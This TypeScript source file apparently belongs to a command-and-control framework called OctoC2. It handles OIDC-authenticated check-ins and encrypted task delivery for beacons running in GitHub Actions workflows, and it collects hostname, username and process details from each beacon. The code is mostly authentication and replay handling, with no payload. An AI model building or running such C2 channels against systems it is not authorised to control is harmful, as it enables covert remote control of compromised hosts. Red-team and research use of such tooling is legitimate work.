import { createHash } from "node:crypto";
import {
  canonicalJson,
  type CheckinPayload,
  type TaskResult,
} from "@octoc2/shared";
import { createRemoteJWKSet, jwtVerify } from "jose";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import {
  DeliveryClaimOwnershipLostError,
  type ClaimedTaskDelivery,
  type TaskQueue,
} from "../TaskQueue.ts";
import {
  base64ToBytes,
  bytesToString,
  encryptForBeacon,
  openSealBox,
} from "../crypto/sodium.ts";
import type { BeaconIdentityService } from "../services/BeaconIdentityService.ts";
import type { TaskService } from "../services/TaskService.ts";
import { RejectedArtifactError } from "../services/ArtifactErrors.ts";
import {
  sha256Hex,
  type CompletedOidcRequest,
  type CompleteTaskResultResult,
  type OctoStore,
} from "../store/index.ts";

const GITHUB_OIDC_ISSUER = "https://token.actions.githubusercontent.com";
const GITHUB_JWKS_URL = `${GITHUB_OIDC_ISSUER}/.well-known/jwks`;
const DEFAULT_OIDC_AUDIENCE = "github-actions";
const OIDC_REPLAY_CHANNEL = "oidc-jti";
const DIRECT_DELIVERY_LEASE_MS = 5 * 60_000;
const OIDC_PROCESSING_LEASE_MS = 30_000;
const OIDC_CONCURRENT_WAIT_MS = 5_000;
const OIDC_CONCURRENT_POLL_MS = 10;

/** Cached GitHub key resolver. */
export const JWKS = createRemoteJWKSet(new URL(GITHUB_JWKS_URL));

export interface OidcBeaconBinding {
  /** Exact, case-insensitive GitHub repository name (`owner/repo`). */
  repository: string;
  /** Pre-enrolled OctoC2 beacon identity. */
  beaconId: string;
  /** Exact GitHub OIDC `sub` values accepted for this beacon. */
  subjects: readonly string[];
  /** Exact GitHub OIDC `workflow_ref` values accepted for this beacon. */
  workflowRefs: readonly string[];
}

export interface VerifiedOidcClaims {
  repository: string;
  subject: string;
  workflowRef: string;
  jti: string;
  expiresAt: string;
  beaconId: string;
}

export interface OidcRoutesConfig {
  registry: BeaconRegistry;
  taskQueue: TaskQueue;
  store: OctoStore;
  identities: BeaconIdentityService;
  tasks: TaskService;
  operatorPublicKey: Uint8Array;
  operatorSecretKey: Uint8Array;
  bindings: readonly OidcBeaconBinding[];
  audience?: string;
}

interface ActiveOidcRequest {
  ownerToken: string;
  workerId: string;
  recovered: boolean;
}

interface PreparedOidcResponse {
  response: Response;
  deliveries?: readonly ClaimedTaskDelivery[];
}

type OidcWaitResult =
  | { status: "cached"; response: Response }
  | { status: "conflict" }
  | { status: "retry" }
  | { status: "failure"; error: unknown }
  | { status: "timeout" };

/**
 * Retained for migration diagnostics only. Repository-derived beacon IDs are
 * not authorization: production OIDC routes require an explicit pre-enrolled
 * repository-to-beacon binding.
 */
export function beaconIdFromRepository(repository: string): string {
  return createHash("sha256").update(repository).digest("hex").slice(0, 16);
}

export async function verifyOidcJwt(
  jwt: string,
  audience = DEFAULT_OIDC_AUDIENCE,
): Promise<Record<string, unknown> | null> {
  try {
    const { payload } = await jwtVerify(jwt, JWKS, {
      issuer: GITHUB_OIDC_ISSUER,
      audience,
    });
    return payload as Record<string, unknown>;
  } catch {
    return null;
  }
}

/**
 * Parse the fail-closed OIDC binding configuration used by server startup.
 *
 * Expected JSON:
 * `[{"repository":"owner/repo","beaconId":"b1","subjects":["repo:..."],` +
 * `"workflowRefs":["owner/repo/.github/workflows/beacon.yml@refs/heads/main"]}]`
 */
export function parseOidcBindings(raw: string): OidcBeaconBinding[] {
  let parsed: unknown;
  try {
    parsed = JSON.parse(raw);
  } catch {
    throw new Error("OIDC bindings must be valid JSON");
  }
  if (!Array.isArray(parsed) || parsed.length === 0) {
    throw new Error("OIDC bindings must be a non-empty JSON array");
  }

  const seen = new Set<string>();
  return parsed.map((entry, index) => {
    if (!isRecord(entry)) {
      throw new Error(`OIDC binding ${index} must be an object`);
    }
    const repository = requireNonEmptyString(
      entry["repository"],
      `OIDC binding ${index}.repository`,
    ).toLowerCase();
    const beaconId = requireNonEmptyString(
      entry["beaconId"],
      `OIDC binding ${index}.beaconId`,
    );
    const subjects = requireStringArray(
      entry["subjects"],
      `OIDC binding ${index}.subjects`,
    );
    const workflowRefs = requireStringArray(
      entry["workflowRefs"],
      `OIDC binding ${index}.workflowRefs`,
    );
    const key = `${repository}\0${beaconId}\0${subjects.join("\0")}\0${workflowRefs.join("\0")}`;
    if (seen.has(key)) throw new Error(`OIDC binding ${index} is duplicated`);
    seen.add(key);
    return { repository, beaconId, subjects, workflowRefs };
  });
}

export class OidcRoutes {
  private readonly bindingsByRepository = new Map<
    string,
    readonly OidcBeaconBinding[]
  >();
  private readonly audience: string;

  constructor(private readonly config: OidcRoutesConfig) {
    this.audience = config.audience?.trim() || DEFAULT_OIDC_AUDIENCE;
    if (config.bindings.length === 0) {
      throw new Error("OIDC routes require at least one explicit identity binding");
    }
    for (const binding of config.bindings) {
      validateBinding(binding);
      const repository = binding.repository.toLowerCase();
      const list = this.bindingsByRepository.get(repository) ?? [];
      this.bindingsByRepository.set(repository, [...list, binding]);
    }
  }

  async handle(req: Request, pathname: string): Promise<Response | null> {
    if (req.method === "POST" && pathname === "/api/oidc/checkin") {
      return this.postCheckin(req);
    }
    if (req.method === "POST" && pathname === "/api/oidc/result") {
      return this.postResult(req);
    }
    return null;
  }

  private async postCheckin(req: Request): Promise<Response> {
    let body: { jwt?: unknown; checkin?: unknown };
    try {
      body = await req.json() as { jwt?: unknown; checkin?: unknown };
    } catch {
      return this.err("invalid JSON body", 400);
    }
    if (typeof body.jwt !== "string" || !body.jwt) {
      return this.err("jwt is required", 400);
    }
    if (!isCheckinPayload(body.checkin)) {
      return this.err("a complete signed checkin is required", 400);
    }
    const checkin = body.checkin;

    const authorization = await this.authorize(body.jwt);
    if (authorization instanceof Response) return authorization;
    const payload = canonicalJson({
      kind: "checkin",
      checkin,
    });
    return this.processAuthorizedRequest(
      authorization,
      payload,
      async (request) => {
        if (checkin.beaconId !== authorization.beaconId) {
          return {
            response: this.err(
              "OIDC identity does not match checkin beacon",
              403,
            ),
          };
        }

        const status = await this.config.identities.verifyAndRegisterCheckin(
          checkin,
          authorization.beaconId,
          7,
        );
        const beacon = this.config.registry.get(authorization.beaconId);
        if (!beacon) {
          return {
            response: this.err("pre-enrolled beacon is unavailable", 403),
          };
        }

        const deliveries: ClaimedTaskDelivery[] = [];
        const encryptedTasks: Array<{
          taskId: string;
          nonce: string;
          ciphertext: string;
        }> = [];
        // A duplicate envelope under a different JTI is proof only that this
        // immutable check-in was accepted before. It must not authorize new
        // task-delivery side effects. A recovered owner for this same durable
        // JTI may reconstruct a response that failed before finalization.
        if (
          status === "accepted" ||
          status === "gap" ||
          request.recovered
        ) {
          deliveries.push(...this.config.taskQueue.claimDeliveries(
            authorization.beaconId,
            "oidc",
            DIRECT_DELIVERY_LEASE_MS,
            request.workerId,
            {
              jti: authorization.jti,
              ownerToken: request.ownerToken,
            },
          ));
          const beaconPublicKey = await base64ToBytes(beacon.publicKey);
          try {
            for (const { task } of deliveries) {
              const encrypted = await encryptForBeacon(
                JSON.stringify({
                  taskId: task.taskId,
                  kind: task.kind,
                  args: task.args,
                  ref: task.ref,
                }),
                beaconPublicKey,
                this.config.operatorSecretKey,
              );
              encryptedTasks.push({ taskId: task.taskId, ...encrypted });
            }
          } catch (error) {
            this.config.taskQueue.finishDeliveries(
              deliveries,
              "transient_failure",
              error,
            );
            throw error;
          }
        }
        return {
          response: this.json({ tasks: encryptedTasks, sequence: status }),
          deliveries,
        };
      },
    );
  }

  private async postResult(req: Request): Promise<Response> {
    let body: { jwt?: unknown; taskId?: unknown; sealed?: unknown };
    try {
      body = await req.json() as {
        jwt?: unknown;
        taskId?: unknown;
        sealed?: unknown;
      };
    } catch {
      return this.err("invalid JSON body", 400);
    }
    if (typeof body.jwt !== "string" || !body.jwt) {
      return this.err("jwt is required", 400);
    }
    if (typeof body.taskId !== "string" || !body.taskId) {
      return this.err("taskId is required", 400);
    }
    if (typeof body.sealed !== "string" || !body.sealed) {
      return this.err("sealed result is required", 400);
    }

    const authorization = await this.authorize(body.jwt);
    if (authorization instanceof Response) return authorization;
    const payload = canonicalJson({
      kind: "task-result",
      sealed: body.sealed,
      taskId: body.taskId,
    });
    return this.processAuthorizedRequest(
      authorization,
      payload,
      async () => {
        let result: TaskResult;
        try {
          const plaintext = await openSealBox(
            body.sealed as string,
            this.config.operatorPublicKey,
            this.config.operatorSecretKey,
          );
          const parsed: unknown = JSON.parse(bytesToString(plaintext));
          if (!isTaskResult(parsed)) throw new Error("invalid task result");
          result = parsed;
        } catch {
          return { response: this.err("sealed result is invalid", 400) };
        }
        if (result.taskId !== body.taskId) {
          return {
            response: this.err(
              "taskId does not match the signed result",
              400,
            ),
          };
        }

        const outcome = await this.config.tasks.acceptSignedResult(
          result,
          authorization.beaconId,
          {
            channel: "oidc",
            messageId: authorization.jti,
            payloadDigest: sha256Hex(body.sealed as string),
          },
        );
        return { response: this.resultResponse(outcome) };
      },
    );
  }

  /**
   * Verify issuer/audience/signature and exact provenance allowlists.
   *
   * JTI consumption is deliberately deferred until the payload-bound request
   * has reached a deterministic outcome. Operational failures remain
   * retryable with the same token.
   */
  private async authorize(jwt: string): Promise<VerifiedOidcClaims | Response> {
    const payload = await verifyOidcJwt(jwt, this.audience);
    if (!payload) return this.err("unauthorized", 401);

    let repository: string;
    let subject: string;
    let workflowRef: string;
    let jti: string;
    let expiresAt: string;
    try {
      repository = requireNonEmptyString(
        payload["repository"],
        "repository claim",
      ).toLowerCase();
      subject = requireNonEmptyString(payload["sub"], "sub claim");
      workflowRef = requireNonEmptyString(
        payload["workflow_ref"],
        "workflow_ref claim",
      );
      jti = requireNonEmptyString(payload["jti"], "jti claim");
      const expiry = payload["exp"];
      if (typeof expiry !== "number" || !Number.isSafeInteger(expiry)) {
        throw new Error("exp claim is required");
      }
      expiresAt = new Date(expiry * 1000).toISOString();
    } catch (error) {
      return this.err(
        error instanceof Error ? error.message : "required claim is missing",
        401,
      );
    }

    const binding = this.bindingsByRepository
      .get(repository)
      ?.find((candidate) =>
        candidate.subjects.includes(subject) &&
        candidate.workflowRefs.includes(workflowRef)
      );
    if (!binding) {
      return this.err("OIDC provenance is not allowlisted", 403);
    }
    if (!this.config.store.getBeacon(binding.beaconId)) {
      return this.err("OIDC beacon is not pre-enrolled", 403);
    }

    return {
      repository,
      subject,
      workflowRef,
      jti,
      expiresAt,
      beaconId: binding.beaconId,
    };
  }

  private async processAuthorizedRequest(
    authorization: VerifiedOidcClaims,
    payload: string,
    handler: (
      request: ActiveOidcRequest,
    ) => Promise<PreparedOidcResponse>,
  ): Promise<Response> {
    const payloadDigest = sha256Hex(canonicalJson({
      beaconId: authorization.beaconId,
      expiresAt: authorization.expiresAt,
      payload,
      repository: authorization.repository,
      subject: authorization.subject,
      workflowRef: authorization.workflowRef,
    }));

    while (true) {
      let begun;
      try {
        begun = this.config.store.beginOidcRequest({
          jti: authorization.jti,
          repository: authorization.repository,
          payloadDigest,
          beaconId: authorization.beaconId,
          tokenExpiresAt: authorization.expiresAt,
          processingLeaseMs: OIDC_PROCESSING_LEASE_MS,
          replayChannel: OIDC_REPLAY_CHANNEL,
        });
      } catch (error) {
        return this.transientError("reservation", error);
      }
      if (begun.status === "cached") {
        return this.cachedResponse(begun.request);
      }
      if (begun.status === "legacy_replay") {
        return this.err("OIDC token replay rejected", 409);
      }
      if (begun.status === "conflicting_replay") {
        return this.err("OIDC token payload conflict", 409);
      }
      if (begun.status === "in_progress") {
        const waited = await this.waitForOidcRequest(
          authorization,
          payloadDigest,
        );
        if (waited.status === "cached") return waited.response;
        if (waited.status === "conflict") {
          return this.err("OIDC token payload conflict", 409);
        }
        if (waited.status === "failure") {
          return this.transientError("reservation wait", waited.error);
        }
        if (waited.status === "timeout") {
          return this.err(
            "OIDC request is still processing; retry with the same token",
            503,
          );
        }
        continue;
      }

      for (const taskId of begun.releasedTaskIds) {
        this.config.taskQueue.refreshTask(taskId);
      }
      const active = {
        ownerToken: begun.ownerToken,
        workerId: begun.workerId,
        recovered: begun.recovered,
      };
      let prepared: PreparedOidcResponse;
      try {
        prepared = await handler(active);
      } catch (error) {
        if (error instanceof DeliveryClaimOwnershipLostError) {
          this.abortRequest(authorization.jti, active, error);
          const waited = await this.waitForOidcRequest(
            authorization,
            payloadDigest,
          );
          if (waited.status === "cached") return waited.response;
          if (waited.status === "conflict") {
            return this.err("OIDC token payload conflict", 409);
          }
          if (waited.status === "failure") {
            return this.transientError("reservation wait", waited.error);
          }
          return this.err(
            "OIDC request ownership changed; retry with the same token",
            503,
          );
        }
        if (!(error instanceof RejectedArtifactError)) {
          this.abortRequest(authorization.jti, active, error);
          return this.err(
            error instanceof Error
              ? `transient OIDC processing failure: ${error.message}`
              : "transient OIDC processing failure",
            503,
          );
        }
        prepared = { response: this.err(error.message, 403) };
      }

      if (prepared.response.status >= 500) {
        this.abortRequest(
          authorization.jti,
          active,
          new Error(`retryable HTTP ${prepared.response.status}`),
        );
        return prepared.response;
      }

      let cachedBody: string;
      let cachedHeaders: Record<string, string>;
      try {
        cachedBody = await prepared.response.clone().text();
        cachedHeaders = Object.fromEntries(
          prepared.response.headers.entries(),
        );
      } catch (error) {
        this.abortRequest(authorization.jti, active, error);
        return this.transientError("response serialization", error);
      }
      let completed;
      try {
        completed = this.config.store.completeOidcRequest({
          jti: authorization.jti,
          repository: authorization.repository,
          payloadDigest,
          beaconId: authorization.beaconId,
          ownerToken: active.ownerToken,
          responseStatus: prepared.response.status,
          responseHeaders: cachedHeaders,
          responseBody: cachedBody,
          outcome: prepared.response.ok ? "accepted" : "rejected",
          deliveryLeaseTokens: prepared.deliveries?.map(
            ({ leaseToken }) => leaseToken,
          ) ?? [],
          replayChannel: OIDC_REPLAY_CHANNEL,
          replayScope: `repo:${authorization.repository}`,
          replayCursor: authorization.expiresAt,
        });
      } catch (error) {
        this.abortRequest(authorization.jti, active, error);
        return this.err(
          error instanceof Error
            ? `transient OIDC finalization failure: ${error.message}`
            : "transient OIDC finalization failure",
          503,
        );
      }

      if (completed.status === "completed") {
        for (const taskId of completed.deliveredTaskIds) {
          this.config.taskQueue.refreshTask(taskId);
        }
        return prepared.response;
      }
      if (completed.status === "cached") {
        return this.cachedResponse(completed.request);
      }
      if (completed.status === "legacy_replay") {
        this.abortRequest(authorization.jti, active);
        return this.err("OIDC token replay rejected", 409);
      }
      if (completed.status === "conflicting_replay") {
        this.abortRequest(authorization.jti, active);
        return this.err("OIDC token payload conflict", 409);
      }

      this.abortRequest(
        authorization.jti,
        active,
        new Error(`OIDC finalization ${completed.status}`),
      );
      if (completed.status === "ownership_lost") {
        const waited = await this.waitForOidcRequest(
          authorization,
          payloadDigest,
        );
        if (waited.status === "cached") return waited.response;
        if (waited.status === "conflict") {
          return this.err("OIDC token payload conflict", 409);
        }
        if (waited.status === "failure") {
          return this.transientError("reservation wait", waited.error);
        }
      }
      return this.err(
        "transient OIDC finalization conflict; retry with the same token",
        503,
      );
    }
  }

  private async waitForOidcRequest(
    authorization: VerifiedOidcClaims,
    payloadDigest: string,
  ): Promise<OidcWaitResult> {
    const deadline = Date.now() + OIDC_CONCURRENT_WAIT_MS;
    while (Date.now() < deadline) {
      let request;
      try {
        request = this.config.store.getOidcRequest(authorization.jti);
      } catch (error) {
        return { status: "failure", error };
      }
      if (!request) return { status: "retry" };
      if (
        request.repository !== authorization.repository ||
        request.payloadDigest !== payloadDigest ||
        request.beaconId !== authorization.beaconId ||
        request.tokenExpiresAt !== authorization.expiresAt
      ) {
        return { status: "conflict" };
      }
      if (request.state === "completed") {
        return {
          status: "cached",
          response: this.cachedResponse(
            request as CompletedOidcRequest,
          ),
        };
      }
      if (
        request.processingLeaseExpiresAt === null ||
        request.processingLeaseExpiresAt <= new Date().toISOString()
      ) {
        return { status: "retry" };
      }
      await delay(OIDC_CONCURRENT_POLL_MS);
    }
    return { status: "timeout" };
  }

  private abortRequest(
    jti: string,
    request: ActiveOidcRequest,
    error?: unknown,
  ): void {
    try {
      const releasedTaskIds = this.config.store.abortOidcRequest({
        jti,
        ownerToken: request.ownerToken,
        workerId: request.workerId,
        ...(error !== undefined && {
          error: error instanceof Error ? error.message : String(error),
        }),
      });
      for (const taskId of releasedTaskIds) {
        this.config.taskQueue.refreshTask(taskId);
      }
    } catch {
      // A failed cleanup leaves a bounded processing/delivery lease. The same
      // JTI remains retryable after takeover instead of being consumed.
    }
  }

  private cachedResponse(request: CompletedOidcRequest): Response {
    return new Response(request.responseBody, {
      status: request.responseStatus,
      headers: request.responseHeaders,
    });
  }

  private transientError(stage: string, error: unknown): Response {
    return this.err(
      error instanceof Error
        ? `transient OIDC ${stage} failure: ${error.message}`
        : `transient OIDC ${stage} failure`,
      503,
    );
  }

  private resultResponse(outcome: CompleteTaskResultResult): Response {
    switch (outcome.status) {
      case "completed":
      case "exact_duplicate":
        return this.json({
          ok: true,
          duplicate: outcome.status === "exact_duplicate",
        });
      case "owner_mismatch":
        return this.err("task belongs to another beacon", 403);
      case "conflicting_duplicate":
      case "conflicting_message":
      case "replayed_message":
        return this.err("conflicting or replayed result", 409);
      case "invalid_signature":
      case "identity_key_mismatch":
        return this.err("result signature rejected", 403);
      case "task_not_found":
        return this.err("task not found", 404);
      case "invalid_state":
        return this.err(`task is ${outcome.state}`, 409);
    }
  }

  private json(data: unknown, status = 200): Response {
    return new Response(JSON.stringify(data), {
      status,
      headers: { "Content-Type": "application/json" },
    });
  }

  private err(message: string, status: number): Response {
    return this.json({ error: message }, status);
  }
}

function validateBinding(binding: OidcBeaconBinding): void {
  requireNonEmptyString(binding.repository, "OIDC binding repository");
  requireNonEmptyString(binding.beaconId, "OIDC binding beaconId");
  requireStringArray(binding.subjects, "OIDC binding subjects");
  requireStringArray(binding.workflowRefs, "OIDC binding workflowRefs");
}

function requireStringArray(value: unknown, name: string): string[] {
  if (
    !Array.isArray(value) ||
    value.length === 0 ||
    !value.every((entry) => typeof entry === "string" && entry.trim())
  ) {
    throw new Error(`${name} must be a non-empty string array`);
  }
  return value.map((entry) => entry.trim());
}

function requireNonEmptyString(value: unknown, name: string): string {
  if (typeof value !== "string" || !value.trim()) {
    throw new Error(`${name} is required`);
  }
  return value.trim();
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function isCheckinPayload(value: unknown): value is CheckinPayload {
  if (!isRecord(value)) return false;
  return [
    "beaconId",
    "publicKey",
    "hostname",
    "username",
    "os",
    "arch",
    "checkinAt",
  ].every((key) => typeof value[key] === "string") &&
    typeof value["pid"] === "number" &&
    isRecord(value["identity"]);
}

function isTaskResult(value: unknown): value is TaskResult {
  if (!isRecord(value)) return false;
  return typeof value["taskId"] === "string" &&
    typeof value["beaconId"] === "string" &&
    typeof value["success"] === "boolean" &&
    typeof value["output"] === "string" &&
    typeof value["completedAt"] === "string" &&
    typeof value["signature"] === "string";
}

function delay(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
